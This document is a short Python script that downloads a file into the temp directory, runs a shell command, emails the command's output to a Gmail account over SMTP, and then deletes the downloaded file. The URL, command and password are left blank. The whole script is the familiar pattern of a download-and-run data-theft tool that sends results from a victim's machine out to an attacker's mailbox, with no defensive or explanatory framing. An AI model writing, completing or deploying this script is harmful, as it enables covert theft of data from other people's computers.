#!/usr/bin/env python

import os
import requests
import smtplib
import subprocess
import tempfile


def download(url):
    response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(response.content)
    return file_name


def send_mail(email, psw, msg):
    server = smtplib.SMTP("smtp.gmail.com", 587, timeout=10)
    try:
        server.starttls()
        server.login(email, psw)
        server.sendmail(email, email, msg)
    finally:
        server.quit()


login = "xxx@gmail.com"
psw = ""

file_url = ""
command = ""

temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)

file_name = download(file_url)
result = subprocess.check_output(command, shell=True)
send_mail(login, psw, result)
os.remove(file_name)
